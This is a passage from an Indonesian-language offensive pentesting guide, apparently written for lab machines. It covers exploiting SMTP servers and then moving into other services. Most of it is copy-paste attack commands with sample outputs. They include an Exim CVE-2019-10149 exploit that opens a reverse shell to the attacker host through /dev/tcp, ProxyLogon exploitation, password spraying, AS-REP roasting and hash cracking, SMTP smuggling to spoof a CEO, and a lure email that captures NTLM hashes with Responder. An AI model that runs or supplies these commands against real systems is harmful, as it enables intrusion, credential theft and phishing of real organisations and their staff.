curl -s --url "imap://$TARGET/Drafts" -u "$SMTP_USER:$SMTP_PASS" \
    --request "FETCH 1:* BODY[TEXT]" >> ~/smtp_loot/emails/imap_drafts.txt
```

**OUTPUT GAGAL ❌ — POP3/IMAP tidak ada:**

text

```
110/tcp  closed pop3
143/tcp  closed imap
```

➡️ Tidak ada mailbox access. Lanjut ke **Fase 6**.

---

## ═══════════════════════════════════════

## FASE 6: CVE CHECK & VERSION EXPLOITATION

## ═══════════════════════════════════════

> **Tujuan:** Jika dapat versi software dari banner, cek apakah ada CVE yang bisa langsung kasih shell.

### Langkah 6.1 — Identifikasi & Cari Exploit

Bash

```
# Dari banner di Langkah 0.2, catat software dan versi
# Contoh: "Exim 4.89", "Postfix 2.10", "Exchange 15.1"

# Search exploit lokal
searchsploit postfix
searchsploit "exim 4"
searchsploit sendmail
searchsploit "microsoft exchange"

# Search online
# Google: "Exim 4.89 exploit site:exploit-db.com"
# Google: "Postfix 2.10 CVE"
```

**OUTPUT BERHASIL ✅ — Ketemu exploit Exim 4.87-4.91 (CVE-2019-10149):**

Bash

```
# Exim < 4.92 - CVE-2019-10149 (The Return of the WIZard)
# Remote Code Execution via recipient command injection

# Cek versi dulu
nc -vn $TARGET 25
# Banner: "220 mail.htb ESMTP Exim 4.89" → VULNERABLE!

# Method 1: Metasploit
msfconsole -q -x "
use exploit/linux/smtp/exim4_string_format;
set RHOSTS $TARGET;
set LHOST $LHOST;
set LPORT $LPORT;
check;
exploit
"
```

**OUTPUT BERHASIL ✅ — check menunjukkan vulnerable:**

text

```
[+] 10.10.11.200:25 - The target appears to be vulnerable.
```

Bash

```
# Lanjut exploit:
# [*] Started reverse TCP handler on 10.10.14.5:4444
# [*] Command shell session 1 opened
# $ whoami
# root
```

**OUTPUT BERHASIL ✅ — Exim CVE-2019-10149 Manual:**

Bash

```
# Manual exploitation (tanpa Metasploit)
git clone https://github.com/Dilshan-Eranda/CVE-2019-10149.git /tmp/exim_exploit
cd /tmp/exim_exploit

# Setup listener
nc -lvnp $LPORT &

# Run exploit
python3 exploit.py -t $TARGET -e "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
```

**OUTPUT BERHASIL ✅ — Microsoft Exchange ProxyLogon (CVE-2021-26855):**

Bash

```
# Jika banner menunjukkan Microsoft Exchange
# Build 15.1.2507 = Exchange 2016 → ProxyLogon

# Step 1: Cek apakah OWA accessible
curl -sk https://$TARGET/owa/ -o /dev/null -w "%{http_code}"
# 200/302 = OWA ada

# Step 2: Gunakan exploit
git clone https://github.com/hausec/ProxyLogon.git /tmp/proxylogon
python3 /tmp/proxylogon/exploit.py -t $TARGET -e $LHOST -p $LPORT

# Atau via Metasploit
msfconsole -q -x "
use exploit/windows/http/exchange_proxylogon_rce;
set RHOSTS $TARGET;
set LHOST $LHOST;
set LPORT $LPORT;
exploit
"
```

**OUTPUT GAGAL ❌ — searchsploit tidak ketemu exploit yang relevan:**

Bash

```
# Coba cari di web
# 1. https://www.exploit-db.com/search?q=NAMASOFTWARE+VERSI
# 2. https://nvd.nist.gov/vuln/search
# 3. Google: "NAMASOFTWARE VERSI RCE site:github.com"

# Jika tidak ada exploit, lanjut ke Fase 7
echo "[*] Tidak ada exploit langsung. Lanjut ke credential reuse."
```

---

## ═══════════════════════════════════════

## FASE 7: CROSS-SERVICE CREDENTIAL TESTING

## ═══════════════════════════════════════

> **Tujuan:** Setiap credentials yang kita dapat dari SMTP, test ke semua service lain yang aktif.

### Langkah 7.1 — Test Credentials ke Semua Service

Bash

```
# Pastikan user dan password sudah di-set
export USER="admin"   # atau dari found_creds.txt
export PASS="Password123!"

echo "[*] Testing credentials: $USER:$PASS against all services"

# SSH (port 22) — paling umum di Linux
nxc ssh $TARGET -u "$USER" -p "$PASS"
# Jika berhasil → ke <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>

# SMB (port 445) — Windows
nxc smb $TARGET -u "$USER" -p "$PASS"
# Jika berhasil → ke <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>

# FTP (port 21)
nxc ftp $TARGET -u "$USER" -p "$PASS"
# Jika berhasil → ke <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>

# WinRM (port 5985) — Windows Remote Management
nxc winrm $TARGET -u "$USER" -p "$PASS"

# RDP (port 3389)
nxc rdp $TARGET -u "$USER" -p "$PASS"

# MSSQL (port 1433)
nxc mssql $TARGET -u "$USER" -p "$PASS"
# Jika berhasil → ke <a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a>

# MySQL (port 3306)
nxc mysql $TARGET -u "$USER" -p "$PASS"
# Jika berhasil → ke <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>

# POP3 (port 110) — baca email
curl -s --url "pop3://$TARGET" -u "$USER:$PASS" --list-only

# IMAP (port 143) — baca email
curl -s --url "imap://$TARGET" -u "$USER:$PASS" --list-only
```

**OUTPUT BERHASIL ✅ — SSH berhasil:**

text

```
SSH  10.10.11.200  22  [+] admin:Password123! Linux
```

➡️ Login SSH:

Bash

```
ssh "$USER@$TARGET"
# Masuk shell! → ke <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a> untuk post-exploitation
```

**OUTPUT BERHASIL ✅ — WinRM Pwn3d:**

text

```
WINRM  10.10.11.200  5985  [+] CORP\admin:Password123! (Pwn3d!)
```

➡️ Shell via evil-winrm:

Bash

```
evil-winrm -i $TARGET -u "$USER" -p "$PASS"

# Di dalam shell:
*Evil-WinRM* PS C:\Users\admin> whoami
corp\admin
*Evil-WinRM* PS C:\Users\admin> whoami /priv
# Cek privilege → ke <a href="/docs/windows-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">45_windows_privesc_workflow.md</a>
```

**OUTPUT GAGAL ❌ — Semua service reject:**

text

```
SSH  10.10.11.200  22  [-] admin:Password123! STATUS_LOGON_FAILURE
SMB  10.10.11.200  445  [-] CORP\admin:Password123! STATUS_LOGON_FAILURE
```

➡️ Credentials valid di SMTP tapi tidak di service lain (password berbeda per service). Lanjut ke **Fase 8** (AD enumeration jika environment domain).

---

### Langkah 7.2 — AD Attack via Username List dari SMTP

Bash

```
# Jika target adalah Active Directory environment
# Gunakan user list dari SMTP untuk Kerberos attacks

# Method 1: AS-REP Roasting (user tanpa pre-auth)
# Coba cari user yang vulnerable
impacket-GetNPUsers "$DOMAIN/" \
    -usersfile ~/smtp_loot/users/valid_users.txt \
    -format hashcat \
    -no-pass \
    -dc-ip $TARGET \
    -outputfile ~/smtp_loot/creds/asrep_hashes.txt

cat ~/smtp_loot/creds/asrep_hashes.txt
```

**OUTPUT BERHASIL ✅ — AS-REP hash didapat:**

text

```
$krb5asrep$23$support@CORP.LOCAL:a1b2c3d4e5f6...hash_data...
```

➡️ Crack hash:

Bash

```
# Crack AS-REP hash
hashcat -m 18200 ~/smtp_loot/creds/asrep_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    --force \
    -o ~/smtp_loot/creds/asrep_cracked.txt

# Lihat hasil
cat ~/smtp_loot/creds/asrep_cracked.txt
# Output: $krb5asrep$23$support@CORP.LOCAL:...:Password1234
# Password adalah bagian setelah titik dua terakhir: Password1234
```

➡️ Setelah dapat password → ke **<a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>**

Bash

```
# Method 2: Password Spraying ke Kerberos
# Lebih stealth daripada SMB spray (tidak trigger banyak Windows Event Log)
kerbrute passwordspray \
    --dc $TARGET \
    --domain $DOMAIN \
    ~/smtp_loot/users/valid_users.txt \
    "Password123!"
```

**OUTPUT BERHASIL ✅ — kerbrute spray berhasil:**

text

```
[+] VALID LOGIN: jordan@CORP.LOCAL:Password123!
```

---

## ═══════════════════════════════════════

## FASE 8: LANJUTAN — SPECIAL SCENARIOS

## ═══════════════════════════════════════

### Langkah 8.1 — STARTTLS Upgrade (Jika Server Minta TLS)

Bash

```
# Cek apakah STARTTLS tersedia
nmap -p 587 --script smtp-starttls-check $TARGET

# Koneksi dengan STARTTLS via swaks
swaks --to "admin@$DOMAIN" \
    --server $TARGET \
    --port 587 \
    --tls \
    --auth LOGIN \
    --auth-user "admin" \
    --auth-password "Password123!" \
    --quit-after AUTH
```

**OUTPUT BERHASIL ✅ — STARTTLS auth berhasil:**

text

```
=== Connected to 10.10.11.200.
<-  220 mail.corp.htb ESMTP Postfix
 -> EHLO kali
<-  250-STARTTLS
 -> STARTTLS
<-  220 2.0.0 Ready to start TLS    ← Upgrade ke TLS berhasil!
 -> AUTH LOGIN
<-  235 2.7.0 Authentication successful
```

**OUTPUT GAGAL ❌ — TLS handshake gagal:**

text

```
TLS connect failed: SSL_connect:error
```

➡️ Coba nonaktifkan sertifikat validation:

Bash

```
swaks --to "admin@$DOMAIN" --server $TARGET --port 587 \
    --tls-optional \
    --auth LOGIN --auth-user "admin" --auth-password "Password123!"
```

---

### Langkah 8.2 — SMTP Smuggling (Advanced — Post-2023 Vulnerability)

> SMTP Smuggling adalah teknik baru yang ditemukan 2023. Memungkinkan spoofing email melewati SPF/DKIM/DMARC.

Bash

```
# Cek apakah server vulnerable ke SMTP smuggling
# Ciri: server menggunakan interpretasi berbeda untuk end-of-data marker

# Manual test - kirim payload dengan bare LF (tanpa CR)
# Tools: https://github.com/The-Login/SMTP-Smuggling-Tools
git clone https://github.com/The-Login/SMTP-Smuggling-Tools.git /tmp/smtp_smuggling

cd /tmp/smtp_smuggling
python3 check.py $TARGET

# Jika vulnerable:
python3 smuggle.py \
    --target $TARGET \
    --from "attacker@$DOMAIN" \
    --to "victim@$DOMAIN" \
    --inner-from "ceo@legit-company.com" \
    --inner-to "victim@$DOMAIN"
```

**Google jika buntu:**

text

```
site:github.com SMTP smuggling exploit 2024
"SMTP smuggling" site:portswigger.net
CVE-2023-51766 exploit
```

---

### Langkah 8.3 — Harvest Credentials via Responder (NTLM Capture)

Bash

```
# Jika target Windows Exchange mencoba autentikasi NTLM ke attacker
# Setup Responder untuk capture hash

# Terminal 1: Jalankan Responder
sudo responder -I tun0 -v

# Terminal 2: Trigger NTLM auth dari target
# (Kirim email dengan embedded image yang load dari attacker IP)
swaks \
    --to "admin@$DOMAIN" \
    --from "noreply@$DOMAIN" \
    --server $TARGET \
    --header "Subject: Document Review Required" \
    --body '<img src="http://'"$LHOST"'/logo.png">' \
    --add-header "Content-Type: text/html"
```

**OUTPUT BERHASIL ✅ — NTLM hash ter-capture di Responder:**

text

```
[SMB] NTLMv2-SSP Hash     : admin::CORP:1122334455667788:HASHDATA
```

➡️ Crack hash:

Bash

```
hashcat -m 5600 "admin::CORP:1122334455667788:HASHDATA" \
    /usr/share/wordlists/rockyou.txt --force

# Atau dengan john
echo "admin::CORP:1122334455667788:HASHDATA" > ntlm.hash
john ntlm.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`502 5.5.2 Command not implemented`|VRFY/EXPN dinonaktifkan|Gunakan `-M RCPT` di smtp-user-enum|
|`503 5.5.1 Bad sequence of commands`|Urutan perintah salah|Ikuti: HELO → MAIL FROM → RCPT TO → DATA|
|`550 5.1.1 User unknown`|Username tidak ada|Ganti wordlist username, coba variasi|
|`550 5.7.1 Relay access denied`|Server tidak mau relay|Ganti domain di RCPT TO dengan domain target|
|`421 4.7.0 Connection rate limit`|Terlalu cepat|Tambah `-m 1` dan `sleep` antar request|
|`535 5.7.8 Authentication failed`|Creds salah|Coba wordlist lebih targeted|
|`454 4.7.0 TLS not available`|SSL cert error|Gunakan `--no-tls` atau `-tls-optional`|
|`Connection refused port 25`|Port 25 diblokir ISP|Coba port 587 atau 465|
|`Timeout saat DATA`|Lupa end marker|Ketik titik `.` pada baris baru, Enter|
|`SPNEGO error`|FQDN tidak resolve|Tambahkan hostname ke `/etc/hosts`|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Port 25/587/465 Open
│
├─ FASE 0: Banner Grab & Fingerprint
│   ├─ Postfix/Exim/Sendmail → Catat versi, cek CVE
│   ├─ Microsoft Exchange    → AD Environment! Catat domain
│   └─ Hostname dari banner  → Tambah ke /etc/hosts
│
├─ FASE 1: OSINT (Passive)
│   ├─ [Email ditemukan]     → Buat user list dari OSINT
│   └─ [Tidak ada]           → Pakai wordlist SecLists
│
├─ FASE 2: User Enumeration
│   ├─ VRFY jika tersedia    → smtp-user-enum -M VRFY
│   ├─ EXPN jika VRFY off    → smtp-user-enum -M EXPN
│   └─ RCPT TO (fallback)    → smtp-user-enum -M RCPT (paling andal)
│       └─ [User list]       → Simpan ke valid_users.txt
│
├─ FASE 3: Open Relay Check
│   ├─ [VULNERABLE]          → Phishing internal via swaks
│   └─ [SECURE]              → Lanjut ke Fase 4
│
├─ FASE 4: Auth Brute Force
│   ├─ [NTLM tersedia]       → Decode NTLM challenge → domain info
│   ├─ [Creds ditemukan]     → Simpan, lanjut ke Fase 5 & 7
│   └─ [Gagal semua]         → Lanjut ke Fase 6
│
├─ FASE 5: Mailbox Access (jika dapat creds)
│   ├─ [POP3/IMAP ada]       → Baca email → cari password tersembunyi
│   └─ [Tidak ada]           → Lanjut ke Fase 7
│
├─ FASE 6: CVE Exploitation (jika versi vulnerable)
│   ├─ [Exim < 4.92]         → CVE-2019-10149 → Root shell
│   ├─ [Exchange 2013-2019]  → ProxyLogon/ProxyShell → SYSTEM
│   └─ [Tidak ada CVE]       → Lanjut ke Fase 7
│
└─ FASE 7: Cross-Service Testing
    ├─ [User list]            → AS-REP Roasting (AD)
    ├─ [Creds ditemukan]      → Test ke SSH/SMB/WinRM/RDP/DB
    └─ [Semua gagal]          → Dokumentasikan, lanjut ke service lain
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"; export LHOST="10.10.14.5"
export DOMAIN="target.htb"; export MAIL_DOMAIN="mail.target.htb"
export SMTP_USER=""; export SMTP_PASS=""
mkdir -p ~/smtp_loot/{users,creds,emails,loot}

# === BANNER GRAB ===
nc -vn -w 5 $TARGET 25                                   # Raw banner
nmap -sV -p 25,465,587 --script smtp-commands $TARGET    # Full fingerprint
echo "$TARGET $MAIL_DOMAIN $DOMAIN" | sudo tee -a /etc/hosts  # Update hosts

# === USER ENUMERATION ===
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $TARGET
smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $TARGET
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -D $DOMAIN -t $TARGET
nmap -p 25 --script smtp-enum-users --script-args="smtp-enum-users.methods={VRFY,RCPT,EXPN}" $TARGET

# Ekstrak user valid
grep "\[+\]" smtp_users.txt | awk '{print $NF}' | tr -d '<>' | cut -d'@' -f1 | sort -u > valid_users.txt

# === OPEN RELAY ===
nmap -p 25 --script smtp-open-relay $TARGET
swaks --to "victim@$DOMAIN" --from "admin@$DOMAIN" --server $TARGET --body "Phishing test"

# === AUTH BRUTE FORCE ===
hydra -L valid_users.txt -P /usr/share/wordlists/rockyou.txt $TARGET smtp -s 25 -t 4 -f
nxc smtp $TARGET -u valid_users.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success

# === MAILBOX ACCESS ===
curl -s -u "$SMTP_USER:$SMTP_PASS" "pop3://$TARGET" --list-only    # POP3
curl -s -u "$SMTP_USER:$SMTP_PASS" "imap://$TARGET" --list-only    # IMAP
for i in $(seq 1 5); do curl -s -u "$SMTP_USER:$SMTP_PASS" "pop3://$TARGET/$i"; done

# === CVE CHECK ===
searchsploit exim 4; searchsploit postfix; searchsploit "exchange 2016"

# === CROSS-SERVICE TEST ===
nxc ssh $TARGET -u "$SMTP_USER" -p "$SMTP_PASS"      # → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
nxc smb $TARGET -u "$SMTP_USER" -p "$SMTP_PASS"      # → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
nxc winrm $TARGET -u "$SMTP_USER" -p "$SMTP_PASS"    # evil-winrm jika Pwn3d!

# === AD ATTACK VIA SMTP USER LIST ===
impacket-GetNPUsers "$DOMAIN/" -usersfile valid_users.txt -format hashcat -no-pass -dc-ip $TARGET
kerbrute passwordspray --dc $TARGET --domain $DOMAIN valid_users.txt "Password123!"
```

---

## Cross-Service Chart dari SMTP

text

```
SMTP Results
     │
     ├─ ─ User List ──→ Port 22  (SSH)     → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
     │                 Port 445 (SMB)     → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
     │                 Port 88  (Kerberos)→ [🏰 35 — Active Directory Initial Enumeration Workflow](/docs/ad-initial-enumeration)
     │                 Port 389 (LDAP)    → <a href="/docs/ldap" class="text-[#00b4d8] hover:underline font-mono font-semibold">11_ldap_workflow.md</a>
     │
     ├─ ─ Domain Name ─→ DNS Enum          → <a href="/docs/dns" class="text-[#00b4d8] hover:underline font-mono font-semibold">09_dns_workflow.md</a>
     │                  AD Enum           → <a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>
     │
     ├─ ─ Valid Creds ─→ Port 22  (SSH)    → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
     │                  Port 445 (SMB)    → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
     │                  Port 5985 (WinRM) → evil-winrm
     │                  Port 3389 (RDP)   → <a href="/docs/rdp" class="text-[#00b4d8] hover:underline font-mono font-semibold">12_rdp_workflow.md</a>
     │                  Port 110/143 (Mail)→ Baca email internal
     │
     └── Open Relay ──→ Internal Phishing → Tunggu creds dari korban
                        NTLM Capture     → Responder → crack hash
```

---

> **➡️ NEXT:** Setelah SMTP selesai — kamu punya user list dan mungkin domain name. Lanjut ke **[09. DNS Enumeration & Reconnaissance Workflow — Master Field Guide](/docs/dns)** untuk Zone Transfer (AXFR) dan subdomain discovery yang akan melengkapi peta infrastruktur target secara menyeluruh.